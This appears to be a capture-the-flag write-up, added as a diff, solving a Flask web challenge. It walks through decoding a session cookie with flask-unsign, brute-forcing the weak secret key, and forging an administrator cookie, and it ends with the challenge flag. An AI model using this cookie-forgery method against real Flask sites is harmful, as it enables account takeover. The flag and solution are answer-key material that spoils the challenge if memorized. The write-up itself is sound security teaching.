@@ -1,0 +1,27 @@
+User can find out that application uses Flask web server from the hint in description or by reading response headers.
+
+1) Login to the web application
+2) Grab the cookie
+3) Look at the content of it
+
+You can use flask-unsign tool for that.
+
+sudo pip3 install flask-unsign[wordlist]
+
+flask-unsign -d -c <YOUR_COOKIE>    
+
+4) Bruteforce the secret key
+
+flask-unsign -u -c eyJsb2dnZWRpbiI6dHJ1ZSwidXNlcm5hbWUiOiJtaWthc2EifQ.YXl5lw.eNRDYaFGpAILsZXcS4Tyu_SLP2A
+
+Default wordlist is fine.
+Secret key is 'secret'.
+
+5) You're already know the target username from the description, so all you have to do is to build new cookie using secret key from the previous step
+
+flask-unsign --sign -c "{'loggedin': True, 'username': 'administrator'}" --secret 'secret' --legacy
+
+6) Apply the new cookie and reload the page
+
+Flag:
+flag{w45h_d0wn_7h3_c00k135_w17h_w473r}
